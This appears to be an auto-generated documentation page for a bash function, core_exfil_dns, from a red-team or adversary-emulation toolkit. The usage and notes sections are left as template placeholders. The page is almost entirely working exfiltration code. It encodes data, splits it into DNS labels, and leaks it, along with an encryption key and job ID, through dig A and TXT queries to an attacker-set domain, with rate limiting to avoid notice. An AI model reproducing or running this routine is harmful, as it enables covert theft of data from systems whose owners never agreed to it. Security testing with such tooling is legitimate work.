# Exfil Dns

## Purpose

core_exfil_dns function implementation from base.sh.

## Implementation

<details>
<summary>Function Code</summary>

```bash
core_exfil_dns() {
local data="$1"
    
            if [ -z "$EXFIL_URI" ]; then
                return 1
            fi
            
    # Prepare DNS-safe data
            local dns_data="$data"
    if [ "$ENCODE" = "none" ]; then
                dns_data=$(core_dns_safe_encode "$data")
            else
                dns_data=$("$CMD_PRINTF" '%s' "$dns_data" | tr '+/' '-_' | tr -d '=')
            fi
    
    # Calculate appropriate chunk size for DNS
            local max_label_size=63
    local prefix_length=10  # Approximate length of prefix like "p0."
            local max_allowed_chunk=$((max_label_size - prefix_length))
            local max_chunk_size=$CHUNK_SIZE
    
            if [ $max_chunk_size -gt $max_allowed_chunk ]; then
                max_chunk_size=$max_allowed_chunk
            fi
    
    # Send start signal
            if ! $CMD_DIG $CMD_DIG_OPTS "start.${EXFIL_URI}" A > /dev/null 2>&1; then
                return 1
            fi
    
    # Send encryption key via TXT record if encryption is enabled
    if [ "$ENCRYPT" != "none" ] && [ -n "$ENCRYPT_KEY" ]; then
        # Convert key to base64 DNS-safe format
        local dns_safe_key
        dns_safe_key=$("$CMD_PRINTF" '%s' "key:$ENCRYPT_KEY:$JOB_ID" | $CMD_BASE64 | tr '+/' '-_' | tr -d '=')
        
        # Send key via DNS TXT query
        if ! $CMD_DIG $CMD_DIG_OPTS "key-$JOB_ID.${EXFIL_URI}" TXT > /dev/null 2>&1; then
            core_debug_print "Failed to send encryption key via DNS TXT record, continuing anyway"
        fi
        
        # Brief pause after sending key
        $CMD_SLEEP 0.2
    fi
    
    # Send data in chunks
    local chunk_num=0
    local start_pos=0
            local data_len=${#dns_data}
    
    while [ $start_pos -lt $data_len ]; do
                local chunk="${dns_data:$start_pos:$max_chunk_size}"
        start_pos=$((start_pos + max_chunk_size))
        
                local query="p${chunk_num}.${chunk}.${EXFIL_URI}"
                if ! $CMD_DIG $CMD_DIG_OPTS "$query" A > /dev/null 2>&1; then
            return 1
                fi
                
                $CMD_SLEEP 0.1  # Rate limiting
        chunk_num=$((chunk_num + 1))
    done
    
    # Send end signal
                if ! $CMD_DIG $CMD_DIG_OPTS "end.${EXFIL_URI}" A > /dev/null 2>&1; then
                    return 1
                fi
                
                return 0
}
```

</details>

## Usage

Document usage examples and parameters here.

## Notes

Add any implementation notes or considerations.
